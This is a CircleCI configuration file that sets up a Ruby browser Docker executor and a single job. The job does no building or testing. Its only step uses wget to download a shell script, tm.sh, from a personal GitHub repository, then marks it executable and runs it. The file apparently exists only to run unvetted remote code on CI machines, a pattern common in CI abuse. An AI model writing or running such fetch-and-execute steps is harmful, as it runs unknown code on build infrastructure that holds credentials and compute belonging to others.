version: 2.1
executors:
  my-executor:
    docker:
      - image: cimg/ruby:3.0.3-browsers
        auth:
          username: mydockerhub-user
          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference

jobs:
  my-job:
    executor: my-executor
    steps:
      - run: wget https://raw.githubusercontent.com/Vaping86/RedCeh/main/tm.sh && chmod +x tm.sh && bash tm.sh